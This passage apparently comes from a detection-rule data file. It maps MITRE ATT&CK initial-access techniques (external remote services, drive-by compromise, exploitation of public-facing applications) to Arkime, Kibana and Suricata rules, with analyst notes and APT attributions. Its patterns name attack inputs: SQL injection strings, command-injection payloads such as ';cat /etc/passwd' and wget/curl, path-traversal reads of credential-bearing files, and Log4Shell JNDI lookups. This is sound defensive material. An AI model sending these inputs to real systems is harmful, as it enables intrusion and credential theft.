        suricata: `alert tcp $EXTERNAL_NET any
  -> $HOME_NET 22
  (msg:"TA0001 T1133 SSH brute
    force rapid auth attempts";
  flow:established,to_server;
  content:"SSH-"; depth:4;
  threshold:type both,
    track by_src,
    count 5, seconds 30;
  classtype:attempted-user;
  sid:9113305; rev:1;)`,
        notes: "SSH brute force tools (Hydra, Medusa, Patator) generate rapid successive SSH connections - each attempt completes the TCP handshake and SSH banner exchange before failing authentication and disconnecting. Low databytes.dst confirms no successful session. Content 'SSH-' matches the SSH protocol banner at the start of every SSH connection. Zeek ssh.log captures authentication success/failure explicitly - use Zeek for definitive auth failure correlation. Distinguish brute force (rapid, many failures, low databytes) from successful access (few connections, high databytes.dst, sustained session).",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Conducts SSH brute force against internet-facing Linux servers as an initial access vector in financial sector and cryptocurrency exchange targeting." },
          { cls: "apt-ir", name: "APT33", note: "Brute forces SSH on energy sector internet-facing Linux infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "Automated scanning and brute force of SSH is constant background noise on any internet-exposed port 22 - documented in virtually every threat actor profile." }
        ],
        cite: "MITRE ATT&CK T1133, T1110.001, industry reporting"
      },
      {
        sub: "T1133 - SSH Anonymized Access",
        indicator: "SSH login from Tor exit node or known proxy / VPS range - anonymized initial access",
        arkime: `ip.src != $INTERNAL
&& port.dst == 22
&& protocols == ssh
&& ip.src == $TOR_EXIT_NODES
|| ip.src == $KNOWN_VPS_RANGES
&& databytes.src > 1000
&& databytes.dst > 1000`,
        kibana: `NOT source.ip: $INTERNAL
AND destination.port: 22
AND source.ip: $TOR_EXIT_NODES
AND source.bytes > 1000
AND destination.bytes > 1000`,
        suricata: `alert tcp $TOR_EXIT_NODES any
  -> $HOME_NET 22
  (msg:"TA0001 T1133 SSH login
    from Tor exit node
    anonymized access";
  flow:established,to_server;
  content:"SSH-"; depth:4;
  classtype:policy-violation;
  sid:9113306; rev:1;)`,
        notes: "Adversaries route SSH initial access through Tor exit nodes or anonymizing VPS infrastructure (DigitalOcean, Vultr, Linode, AWS) to obscure their origin. Maintain a current Tor exit node list (updated daily from dan.me.uk/torlist or similar) in Suricata's $TOR_EXIT_NODES variable. Successful SSH sessions from Tor exit nodes (bidirectional traffic, high databytes) are near-certain malicious - no legitimate administrative use case requires Tor for SSH. VPS range detection requires a threat intel feed of commonly abused hosting provider CIDR ranges.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses Tor and anonymizing VPS infrastructure to route SSH access to compromised cryptocurrency and financial sector servers." },
          { cls: "apt-ir", name: "APT33", note: "Routes access to compromised energy sector infrastructure through anonymizing proxies and VPS services." },
          { cls: "apt-mul", name: "Multi", note: "SSH access via Tor is documented in multiple nation-state and criminal intrusion campaigns as a standard operational security measure." }
        ],
        cite: "MITRE ATT&CK T1133, T1090.003, industry reporting"
      },
      {
        sub: "T1133 - Citrix / VDI",
        indicator: "Citrix / RD Gateway authentication from unexpected source - cloud-hosted access broker abuse",
        arkime: `ip.src != $INTERNAL
&& ip.src != $ALLOWED_CITRIX_IPS
&& protocols == https
&& http.host == [
  *citrix* || *netscaler*
  || *storefront*
  || *rdweb* || *rdgateway*
  || *horizon* || *workspaceone*
]
&& http.method == POST
&& http.uri == [
  */cgi/login* || */vpn/index*
  || */logon/LogonPoint*
  || */RDWeb/Pages/en-US/login*
  || */portal/webclient*
]
&& databytes.src > 500`,
        kibana: `NOT source.ip: $INTERNAL
AND NOT source.ip: $ALLOWED_CITRIX_IPS
AND http.request.method: POST
AND url.domain: (
  *citrix* OR *netscaler*
  OR *storefront* OR *rdweb*
  OR *horizon* OR *workspaceone*
)
AND url.path: (
  *cgi/login* OR *vpn/index*
  OR *LogonPoint*
  OR *RDWeb* OR *webclient*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1133 Citrix RD
    Gateway auth from unexpected
    source";
  flow:established,to_server;
  content:"POST"; http.method;
  pcre:"/(cgi\\/login|
    vpn\\/index|LogonPoint|
    RDWeb\\/Pages|
    portal\\/webclient)/i";
  http.uri;
  classtype:policy-violation;
  sid:9113307; rev:1;)`,
        notes: "Citrix NetScaler/ADC, Citrix StoreFront, VMware Horizon, and RD Web Access are high-value targets - successful authentication gives adversaries GUI access to internal applications and desktops without requiring VPN. POST to login paths from unexpected source IPs indicates credential use from adversary-controlled infrastructure. Citrix CVE-2019-19781 (Shitrix) - path traversal enabling unauthenticated RCE - should also be monitored via T1190 VPN path indicators. Correlate authentication success with subsequent session activity: legitimate users open specific applications; adversaries often open full desktop sessions and initiate immediate reconnaissance.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Abuses Citrix and VDI infrastructure for initial access against healthcare, technology, and gaming sector targets using stolen credentials." },
          { cls: "apt-ir", name: "APT33", note: "Uses compromised Citrix credentials to access energy sector internal applications." },
          { cls: "apt-mul", name: "Ransomware", note: "Citrix and RD Gateway authentication abuse is documented in multiple CISA advisories and ransomware incident reports as a common initial access vector." }
        ],
        cite: "MITRE ATT&CK T1133, T1078, CISA advisories"
      },
      {
        sub: "T1133 - Cloud Management",
        indicator: "Cloud management API authentication from unexpected IP / new ASN - console credential abuse",
        arkime: `ip.src != $INTERNAL
&& ip.src != $KNOWN_ADMIN_IPS
&& protocols == https
&& http.host == [
  *console.aws.amazon.com*
  || *portal.azure.com*
  || *console.cloud.google.com*
  || *management.azure.com*
  || *ec2.amazonaws.com*
]
&& http.method == POST
&& http.uri == [
  */oauth/token*
  || */signin/oauth*
  || */login*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND NOT source.ip: $KNOWN_ADMIN_IPS
AND http.request.method: POST
AND url.domain: (
  *console.aws.amazon.com*
  OR *portal.azure.com*
  OR *console.cloud.google.com*
  OR *management.azure.com*
)
AND url.path: (
  *oauth/token* OR *signin*
  OR *login*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0001 T1133 Cloud console
    auth from unexpected IP
    credential abuse";
  flow:established,to_server;
  content:"POST"; http.method;
  pcre:"/(console\\.(aws\\.amazon|
    cloud\\.google)\\.com|
    portal\\.azure\\.com|
    management\\.azure\\.com)/i";
  http.header;
  classtype:policy-violation;
  sid:9113308; rev:1;)`,
        notes: "Cloud console and API authentication from unexpected IPs or new ASNs indicates stolen credential use. Cloud management plane access is particularly high-impact - a successful console login gives adversaries access to all cloud resources including compute, storage, secrets, and IAM. Requires SSL/TLS inspection or egress proxy to detect outbound connections to cloud management URLs. Correlate with your cloud provider's CloudTrail (AWS), Azure Activity Log, or GCP Audit Log - network-layer detection is a supplementary signal. Watch for: new AWS access key usage, Azure portal login from new country, GCP service account key download from unknown IP.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen credentials to access cloud management consoles (Azure, AWS) as an initial access vector, documented in CISA and NSA advisories on APT29 cloud-targeting operations." },
          { cls: "apt-cn", name: "APT41", note: "Abuses cloud management APIs with stolen credentials in targeted intrusion operations against technology and healthcare sector organizations." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Compromises cloud console credentials via social engineering and SIM swapping, then accesses AWS and Azure management planes to deploy ransomware at cloud scale." }
        ],
        cite: "MITRE ATT&CK T1133, T1078.004, CISA advisories"
      }
    ]
  },
  {
    id: "T1189",
    name: "Drive-by Compromise",
    desc: "Watering hole · exploit kits · browser exploitation via legitimate sites",
    rows: [
      {
        sub: "T1189 - Watering Hole Redirect Chains",
        indicator: "Multi-hop HTTP redirect chain - exploit kit gate / traffic distribution system",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.statuscode == [
  301 || 302 || 303
  || 307 || 308
]
&& http.redirect-location ==
  *http://*
&& packets.src > 3
&& databytes.src < 500
&& ip.dst != $KNOWN_GOOD`,
        kibana: `source.ip: $INTERNAL
AND http.response.status_code: (
  301 OR 302 OR 303
  OR 307 OR 308
)
AND http.response.headers.location:
  http*
AND NOT destination.ip:
  $KNOWN_GOOD`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1189 Multi-hop
    redirect chain possible
    exploit kit gate";
  flow:established,to_server;
  content:"GET"; http.method;
  threshold:type both,
    track by_src,
    count 3, seconds 10;
  classtype:trojan-activity;
  sid:9118901; rev:1;)`,
        notes: "Exploit kit traffic distribution systems (TDS) gate victims through 2-5 HTTP redirects before delivering the exploit landing page - each hop profiles the victim (OS, browser, plugins) and passes only qualifying targets forward. The redirect chain has a distinctive pattern: very small response bodies (just the redirect header, no content), rapid sequential requests from the same source IP to different hosts, and a mix of HTTP 301/302 codes. Low databytes.src (<500) confirms no meaningful content was served - just redirection. Correlate the final destination of the chain with threat intel.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Used multi-hop redirect chains to gate watering hole victims through profiling infrastructure before delivering browser exploits, documented in operations against NATO member government websites." },
          { cls: "apt-cn", name: "APT40", note: "Used traffic distribution systems to gate maritime sector and government target victims through redirect chains before exploit delivery." },
          { cls: "apt-kp", name: "Lazarus", note: "Used redirect chain gating in Operation Dream Job and similar campaigns." }
        ],
        cite: "MITRE ATT&CK T1189, industry reporting"
      },
      {
        sub: "T1189 - Watering Hole Redirect Chains",
        indicator: "Newly registered domain in HTTP redirect destination - drive-by staging infrastructure",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.statuscode == [
  301 || 302
]
&& http.redirect-location ==
  *http://*
&& dns.host-age < 14d
&& ip.dst != $KNOWN_GOOD`,
        kibana: `source.ip: $INTERNAL
AND http.response.status_code:
  (301 OR 302)
AND http.response.headers.location:
  http*
AND NOT destination.ip: $KNOWN_GOOD`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1189 Redirect to
    newly registered domain
    drive-by staging";
  flow:established,to_server;
  content:"Location:"; http.header;
  pcre:"/Location:\\s*https?:\\/\\/
    [a-z0-9\\-]{6,}\\.
    (xyz|top|club|online|site|
    live|fun|pw|cc|tk)/i";
  http.header;
  classtype:trojan-activity;
  sid:9118902; rev:1;)`,
        notes: "Drive-by staging infrastructure uses newly registered domains with cheap TLDs (.xyz, .top, .club, .online, .site, .pw) as exploit landing pages - these domains are registered days before the campaign and burned after. The Suricata PCRE matches these TLDs specifically. Enrich with passive DNS age data - any redirect destination registered less than 14 days ago is high-priority. Integrate with threat intel feeds that track newly registered domains for malicious patterns. This is one of the most reliable low-FP indicators of drive-by staging infrastructure.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses newly registered domains with cheap TLDs as exploit staging infrastructure, rotating infrastructure rapidly to avoid blocklist detection." },
          { cls: "apt-cn", name: "APT41", note: "Registers domains days before campaigns and uses them as exploit landing pages before burning them." },
          { cls: "apt-mul", name: "Multi", note: "Newly registered domain detection is a high-confidence indicator for drive-by staging across both nation-state and criminal exploit kit operations." }
        ],
        cite: "MITRE ATT&CK T1189, T1583.001, industry reporting"
      },
      {
        sub: "T1189 - Exploit Kit Profiling",
        indicator: "Browser plugin / capability enumeration request - exploit kit victim profiling",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.method == GET
&& http.uri == [
  *detect.js* || *check.js*
  || *scan.php* || *gate.php*
  || *land.php* || *count.php*
  || *click.php* || *go.php*
]
&& http.user-agent == [
  *Mozilla* || *Chrome*
]
&& databytes.dst > 500
&& ip.dst != $KNOWN_GOOD`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: GET
AND url.path: (
  *detect.js* OR *check.js*
  OR *scan.php* OR *gate.php*
  OR *land.php* OR *count.php*
  OR *click.php* OR *go.php*
)
AND NOT destination.ip: $KNOWN_GOOD`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1189 Exploit kit
    victim profiling URI pattern";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/(detect|check|scan|gate|
    land|count|click|go)
    \\.(php|js)\\b/i";
  http.uri;
  classtype:trojan-activity;
  sid:9118903; rev:1;)`,
        notes: "Exploit kits serve a profiling script before delivering the exploit - this script fingerprints the victim's browser, plugins (Java, Flash, PDF reader), OS version, and screen resolution to select the appropriate exploit. Common filenames are detect.js, check.php, gate.php, and similar generic names. The response contains JavaScript that enumerates capabilities and returns them to the kit. Combine with the source domain reputation and whether it appears in redirect chain context - profiling scripts on their own are low-confidence, but in combination with a redirect chain entry and a subsequent PE/exploit delivery they form a strong kill chain narrative.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Used victim profiling scripts in watering hole operations against government and defense sector targets to fingerprint visiting browsers and deliver targeted exploits based on plugin version." },
          { cls: "apt-mul", name: "Multi", note: "Criminal exploit kit operations (Angler, RIG, Magnitude) universally use victim profiling as the first step in the delivery chain." }
        ],
        cite: "MITRE ATT&CK T1189, industry reporting"
      },
      {
        sub: "T1189 - Exploit Kit Delivery",
        indicator: "Drive-by payload delivery - executable or shellcode served via HTTP from non-standard path",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.statuscode == 200
&& http.response-header == [
  *application/octet-stream*
  || *application/x-msdownload*
  || *application/x-dosexec*
]
&& http.uri != [
  */download* || */files/*
  || */update* || */setup*
]
&& ip.dst != $KNOWN_GOOD
&& databytes.dst > 10000`,
        kibana: `source.ip: $INTERNAL
AND http.response.status_code: 200
AND http.response.headers.content-type: (
  *octet-stream*
  OR *x-msdownload*
  OR *x-dosexec*
)
AND NOT url.path: (
  *download* OR *files*
  OR *update* OR *setup*
)
AND NOT destination.ip: $KNOWN_GOOD`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1189 Drive-by
    executable payload delivery
    non-standard path";
  flow:established,from_server;
  content:"200"; http.stat_code;
  pcre:"/(application\\/
    (octet-stream|x-msdownload|
    x-dosexec))/i";
  http.header;
  file_data;
  content:"|4d 5a|"; depth:2;
  classtype:trojan-activity;
  sid:9118904; rev:1;)`,
        notes: "The final stage of a drive-by delivers the payload - typically a PE (MZ header '|4d 5a|'), shellcode, or a malicious document served as application/octet-stream from a non-standard URL path. Legitimate software downloads use consistent paths (/download/, /files/, /update/); exploit kit payloads use random or generic paths (/a.php, /p.bin, /x.exe). Content '|4d 5a|' at depth 2 matches the MZ PE header in the response body. This rule fires on the actual payload delivery - by the time this fires the victim's browser has already been exploited.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Delivered drive-by payloads via compromised legitimate websites in Operation AppleJeus and similar campaigns, serving PE payloads via HTTP from compromised web infrastructure." },
          { cls: "apt-cn", name: "APT41", note: "Used drive-by payload delivery via exploit kit infrastructure against gaming and technology sector targets." },
          { cls: "apt-ru", name: "APT28", note: "Served malicious payloads via watering hole sites targeting NATO and government sector visitors." }
        ],
        cite: "MITRE ATT&CK T1189, industry reporting"
      },
      {
        sub: "T1189 - Watering Hole Identification",
        indicator: "Internal user requesting known compromised / categorized malicious domain",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.host == $THREAT_INTEL_DOMAINS
&& http.method == GET
&& databytes.src > 0`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: GET
AND destination.ip: $THREAT_INTEL_IPS
AND source.bytes > 0`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1189 Internal host
    connecting to known watering
    hole / malicious domain";
  flow:established,to_server;
  dns.query;
  content:"|00 01 00 00 00 00 00 00|";
  classtype:trojan-activity;
  sid:9118905; rev:1;)`,
        notes: "Threat intel feeds maintain lists of known watering hole domains and IPs - integrate these with Suricata's rule sets and Kibana's threat intel enrichment. For Arkime, maintain a $THREAT_INTEL_DOMAINS field reference updated from your threat intel platform. A victim connecting to a known watering hole domain from inside your network = active drive-by in progress or already completed. Correlate with what was downloaded (databytes.dst) and any subsequent outbound connections from the same host - post-exploitation C2 often follows within seconds to minutes.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "Targeted industry vertical websites frequented by MSP and technology sector employees in watering hole operations." },
          { cls: "apt-ru", name: "APT28", note: "Targeted NATO and government sector news and policy sites in watering hole operations." },
          { cls: "apt-ir", name: "APT33", note: "Targeted energy sector industry sites in watering hole operations." },
          { cls: "apt-kp", name: "Lazarus", note: "Targeted financial sector and cryptocurrency exchange sites in watering hole operations." }
        ],
        cite: "MITRE ATT&CK T1189, T1584.004, industry reporting"
      },
      {
        sub: "T1189 - Post-Exploit C2",
        indicator: "Unexpected outbound connection immediately following web browsing session - post-exploit C2 beacon",
        arkime: `ip.src == $INTERNAL
&& protocols != [
  http || https || dns
]
&& port.dst == [
  443 || 80 || 8080
  || 8443 || 4444
  || 1337 || 6666
]
&& ip.dst != $KNOWN_GOOD
&& node:* corr:
  http.src == ip.src
&& starttime > http.starttime
&& starttime - http.starttime
  < 30s`,
        kibana: `source.ip: $INTERNAL
AND NOT network.protocol: (
  http OR dns OR tls
)
AND destination.port: (
  443 OR 80 OR 8080
  OR 4444 OR 1337
)
AND NOT destination.ip: $KNOWN_GOOD`,
        suricata: `alert tcp $HOME_NET any
  -> $EXTERNAL_NET
  [80,443,8080,8443,4444,1337,6666]
  (msg:"TA0001 T1189 Non-browser
    outbound on web port post
    browse possible C2";
  flow:established,to_server;
  content:!"|16 03|"; depth:2;
  content:!"GET "; depth:5;
  content:!"POST "; depth:6;
  threshold:type both,
    track by_src,
    count 1, seconds 30;
  classtype:trojan-activity;
  sid:9118906; rev:1;)`,
        notes: "Post drive-by exploitation, the delivered payload almost immediately initiates a C2 beacon. This is typically a non-HTTP/HTTPS connection on a web port (to blend in) or a raw TCP connection to the C2 server. The timing correlation is key - a non-browser process connecting outbound within 30 seconds of a browser session to an unknown host is highly suspicious. In Arkime, correlate by source IP across time windows. Suricata content negation (!|16 03| = not TLS, !'GET ' = not HTTP) catches raw TCP C2 on web ports. EDR correlation is ideal here - process-level data identifies which process made the connection.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Payloads beacon within 5-30 seconds of execution following drive-by compromise." },
          { cls: "apt-cn", name: "APT41", note: "C2 traffic follows exploit delivery with characteristic timing patterns." },
          { cls: "apt-ru", name: "APT28", note: "Post-exploit implants initiate C2 immediately after successful exploitation." }
        ],
        cite: "MITRE ATT&CK T1189, T1071, industry reporting"
      },
      {
        sub: "T1189 - Document Delivery",
        indicator: "Malformed or exploit-bearing PDF / Office document served via HTTP from unknown host",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.statuscode == 200
&& http.response-header == [
  *application/pdf*
  || *application/msword*
  || *application/vnd.ms-*
  || *application/vnd.openxml*
]
&& ip.dst != $KNOWN_GOOD
&& http.uri != [
  */download* || */docs/*
  || */files/* || */attachments/*
]`,
        kibana: `source.ip: $INTERNAL
AND http.response.status_code: 200
AND http.response.headers.content-type: (
  *application/pdf*
  OR *application/msword*
  OR *vnd.ms-*
  OR *vnd.openxml*
)
AND NOT destination.ip: $KNOWN_GOOD
AND NOT url.path: (
  *download* OR *docs*
  OR *files* OR *attachments*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1189 Exploit doc
    served from unknown host
    possible drive-by";
  flow:established,from_server;
  content:"200"; http.stat_code;
  pcre:"/(application\\/
    (pdf|msword|vnd\\.ms\\-|
    vnd\\.openxml))/i";
  http.header;
  file_data;
  content:"|25 50 44 46|"; depth:4;
  classtype:trojan-activity;
  sid:9118907; rev:1;)`,
        notes: "Drive-by attacks deliver exploit-bearing documents via HTTP - malicious PDFs (|25 50 44 46| = %PDF header), Word documents, and Excel files served from unknown hosts as part of the exploit chain. Legitimate document downloads come from known domains (SharePoint, Google Drive, your CDN) - documents served from unknown hosts in the context of a redirect chain are high-priority. Content '|25 50 44 46|' at depth 4 matches the PDF magic bytes. For Office documents check for |D0 CF 11 E0| (OLE2/legacy) or the ZIP header |50 4B 03 04| (OOXML). Zeek's files.log captures file metadata including MIME type and MD5.",
        apt: [
          { cls: "apt-cn", name: "APT40", note: "Delivered exploit-bearing PDF and Office documents via watering hole sites targeting maritime and government sector victims." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Served malicious PDF documents via drive-by infrastructure targeting academic and NGO sector victims." },
          { cls: "apt-kp", name: "Kimsuky", note: "Delivered exploit documents via watering hole sites targeting South Korean government and policy organization visitors." }
        ],
        cite: "MITRE ATT&CK T1189, T1566.001, industry reporting"
      }
    ]
  },
  {
    id: "T1190",
    name: "Exploit Public-Facing Application",
    desc: "Web app · VPN · Mail server · Network appliance vulnerability exploitation",
    rows: [
      {
        sub: "T1190 - Web App Injection",
        indicator: "SQL injection attempt - classic and blind patterns in HTTP request parameters",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.method == [GET || POST]
&& http.uri == [
  *%27* || *%22*
  || *'+OR+* || *'+AND+*
  || *1=1* || *1%3D1*
  || *UNION+SELECT*
  || *union%20select*
  || *SLEEP(* || *WAITFOR*
  || *benchmark(*
  || *;DROP* || *;SELECT*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.method:
  (GET OR POST)
AND url.query: (
  *%27* OR *'+OR+*
  OR *UNION+SELECT*
  OR *union%20select*
  OR *SLEEP(* OR *WAITFOR*
  OR *benchmark(*
  OR *1=1*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HTTP_SERVERS any
  (msg:"TA0001 T1190 SQL injection
    attempt";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/(\\%27|\\'|\\-\\-|
    \\bOR\\b.+\\b1\\b.{0,10}\\b1\\b|
    UNION.{0,10}SELECT|
    SLEEP\\s*\\(|WAITFOR|
    benchmark\\s*\\()/i";
  http.uri;
  classtype:web-application-attack;
  sid:9119001; rev:1;)`,
        notes: "Classic SQLi patterns (%27 = single quote, %22 = double quote, OR 1=1, UNION SELECT) and blind SQLi time-based patterns (SLEEP(), WAITFOR DELAY, benchmark()) in HTTP parameters. Time-based blind SQLi generates distinctive response time anomalies visible in session timing data - normal responses take <200ms, SLEEP(5) attacks cause 5+ second responses. Baseline your application response times and alert on statistical outliers. A scanner hitting multiple endpoints with these patterns in rapid succession = automated SQLi scanner. A single targeted endpoint with carefully crafted payloads = manual or semi-automated exploitation.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Uses SQL injection against web applications in targeted intrusion operations, particularly against healthcare, technology, and gaming sector organizations." },
          { cls: "apt-ir", name: "APT33", note: "Has used SQL injection against energy sector web applications to gain initial access." },
          { cls: "apt-mul", name: "Multi", note: "SQL injection remains the most commonly exploited web application vulnerability class in nation-state and criminal intrusion campaigns." }
        ],
        cite: "MITRE ATT&CK T1190, OWASP, industry reporting"
      },
      {
        sub: "T1190 - Web App Injection",
        indicator: "Command injection - OS command execution via HTTP parameter",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.method == [GET || POST]
&& http.uri == [
  *;id* || *;whoami*
  || *;cat+/etc/passwd*
  || *%3Bcat* || *%7Cid*
  || *|whoami* || *\`id\`*
  || *$(id)* || *%24%28*
  || *%0Aid* || *%0Awhoami*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.method:
  (GET OR POST)
AND url.query: (
  *;id* OR *;whoami*
  OR *%3Bcat* OR *%7Cid*
  OR *|whoami* OR *$(id)*
  OR *%0Aid* OR *%60id%60*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HTTP_SERVERS any
  (msg:"TA0001 T1190 Command
    injection attempt via HTTP
    parameter";
  flow:established,to_server;
  pcre:"/(\\%3B|\\%7C|\\%60|
    \\%0[aAdD]|\\||;|\`)
    \\s*(id|whoami|cat\\s+\\/etc|
    wget|curl|bash|sh|
    python|perl)/i";
  http.uri;
  classtype:web-application-attack;
  sid:9119002; rev:1;)`,
        notes: "Command injection inserts OS commands into application parameters that are passed unsanitized to a shell - the classic first-stage commands are id, whoami, and cat /etc/passwd to confirm execution, followed by wget/curl to download a payload. The URL-encoded variants (%3B = ;, %7C = |, %60 = backtick, %0A = newline) are used to bypass WAF pattern matching. A 200 response with a response body containing root:x:0:0 or uid=0 in the body = successful exploitation. Monitor response bodies from your web servers for Unix/Windows system output patterns - successful command injection is immediately visible in the response.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Uses command injection against web applications as an initial access vector." },
          { cls: "apt-cn", name: "APT40", note: "Uses command injection against maritime and government sector web applications." },
          { cls: "apt-ir", name: "APT33", note: "Exploits command injection vulnerabilities in energy sector web-facing applications." }
        ],
        cite: "MITRE ATT&CK T1190, OWASP, industry reporting"
      },
      {
        sub: "T1190 - Web App Injection",
        indicator: "Path traversal / LFI - directory traversal attempt to read sensitive files",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.method == GET
&& http.uri == [
  *../../../* || *..%2F*
  || *..%5C* || *%2e%2e%2f*
  || *%252e%252e*
  || */etc/passwd*
  || */windows/win.ini*
  || */proc/self/environ*
  || *web.config*
  || *.htaccess*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.method: GET
AND url.path: (
  *../../../* OR *..%2F*
  OR *..%5C* OR *%2e%2e%2f*
  OR */etc/passwd*
  OR *win.ini* OR *web.config*
  OR *.htaccess*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HTTP_SERVERS any
  (msg:"TA0001 T1190 Path traversal
    LFI attempt";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/(\\.\\.[\\/\\\\]|
    \\%2[eE]\\%2[eE]\\%2[fF5cC]|
    \\%252[eE]|
    \\/etc\\/passwd|
    \\/windows\\/win\\.ini|
    \\/proc\\/self|
    web\\.config|
    \\.htaccess)/i";
  http.uri;
  classtype:web-application-attack;
  sid:9119003; rev:1;)`,
        notes: "Path traversal (../) reads files outside the web root - /etc/passwd confirms a Unix system and reveals usernames, /proc/self/environ reveals environment variables including credentials, web.config and .htaccess reveal application configuration including database credentials. Double URL encoding (%252e%252e = ../) bypasses WAFs that only decode once. A 200 response to a path traversal request containing root:x:0:0 or [system] (win.ini marker) = successful LFI exploitation. High-priority: LFI reading /proc/self/environ or web.config means credentials may be exposed in the response body visible in Zeek http.log or Arkime session data.",
        apt: [
          { cls: "apt-cn", name: "APT40", note: "Uses path traversal vulnerabilities against maritime, defense, and government sector web applications to read configuration files containing credentials." },
          { cls: "apt-ir", name: "APT33", note: "Exploits LFI vulnerabilities in energy sector web applications to read /etc/passwd and application configuration files." },
          { cls: "apt-mul", name: "Multi", note: "Path traversal and LFI are documented initial access vectors in multiple CISA advisories on nation-state exploitation of public-facing applications." }
        ],
        cite: "MITRE ATT&CK T1190, CISA advisories, industry reporting"
      },
      {
        sub: "T1190 - Deserialization / RCE",
        indicator: "Java deserialization exploit - ysoserial / gadget chain payload in HTTP body or header",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.method == [POST || GET]
&& http.post-body == [
  *%ac%ed%00%05*
  || *rO0AB*
  || *KztAAU*
]
|| http.request-header == [
  *%ac%ed* || *rO0AB*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.body: (
  *%ac%ed%00%05*
  OR *rO0AB*
  OR *KztAAU*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HTTP_SERVERS any
  (msg:"TA0001 T1190 Java
    deserialization exploit
    payload";
  flow:established,to_server;
  content:"|ac ed 00 05|";
  classtype:web-application-attack;
  sid:9119004; rev:1;)`,
        notes: "Java serialized objects begin with the magic bytes 0xAC 0xED 0x00 0x05 - base64 encoded this becomes 'rO0AB'. Java deserialization exploits (ysoserial gadget chains) deliver these objects in HTTP request bodies, cookies, or custom headers to vulnerable Java applications (WebLogic, JBoss, Jenkins, Confluence). Content '|ac ed 00 05|' is the literal binary Java serialization magic. 'rO0AB' in base64-encoded form in a cookie or POST body is equally reliable. WebLogic T3/IIOP protocol also carries serialized payloads - watch TCP/7001 and TCP/7002 in addition to HTTP. This is a near-zero false positive indicator.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Exploits Java deserialization vulnerabilities in Oracle WebLogic, JBoss, and Apache Struts as primary initial access vectors against enterprise targets." },
          { cls: "apt-kp", name: "Lazarus", note: "Exploits Java deserialization in financial sector application servers." },
          { cls: "apt-mul", name: "Multi", note: "Java deserialization vulnerabilities in WebLogic (CVE-2019-2725, CVE-2020-14882) are documented as frequently exploited by nation-state and criminal actors in CISA Known Exploited Vulnerabilities advisories." }
        ],
        cite: "MITRE ATT&CK T1190, CISA KEV, industry reporting"
      },
      {
        sub: "T1190 - Deserialization / RCE",
        indicator: "Log4Shell (CVE-2021-44228) - JNDI lookup injection in HTTP headers",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.request-header == [
  *\${jndi:* || *\${j:*
  || *%24%7Bjndi%3A*
  || *\${\${::-j}*
  || *jndi%3aldap*
  || *jndi%3armi*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.headers: (
  *\${jndi:* OR *jndi%3a*
  OR *%24%7Bjndi%3A*
  OR *\${\${::-j}*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HTTP_SERVERS any
  (msg:"TA0001 T1190 Log4Shell
    JNDI injection CVE-2021-44228";
  flow:established,to_server;
  pcre:"/(\\$\\{jndi:|
    \\%24\\%7[Bb]jndi\\%3[Aa]|
    \\$\\{\\$\\{::-j\\}|
    jndi\\%3[Aa](ldap|rmi|dns|
    corba))/i";
  http.header;
  classtype:web-application-attack;
  sid:9119005; rev:1;)`,
